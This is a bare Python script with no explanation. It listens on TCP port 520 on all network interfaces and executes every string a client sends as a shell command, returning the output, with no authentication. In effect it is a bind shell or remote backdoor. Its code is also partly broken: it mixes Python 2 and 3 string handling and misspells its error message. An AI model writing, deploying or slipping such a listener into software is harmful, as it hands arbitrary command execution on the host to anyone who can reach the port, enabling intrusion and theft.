from socket import *
from time import *
import os

host = ''
port = 520
bufsize = 1024
addr = (host, port)

sersock = socket(AF_INET, SOCK_STREAM)
sersock.bind(addr)
sersock.listen(5)


def getstatus(cmd):
    info = os.popen(cmd)
    info_text = info.read()
    info_status = info.close()
    return info_text, info_status


while True:
    print("waiting for connection...")
    clisock, addr = sersock.accept()
    print("connected from :", addr)

    while True:
        data = clisock.recv(bufsize)
        if not data:
            break
        text, status = getstatus(data.strip())
        if not status:
            clisock.send(text)
        else:
            clisock.send('Eroor eyna')
    clisock.close()
sersock.close()
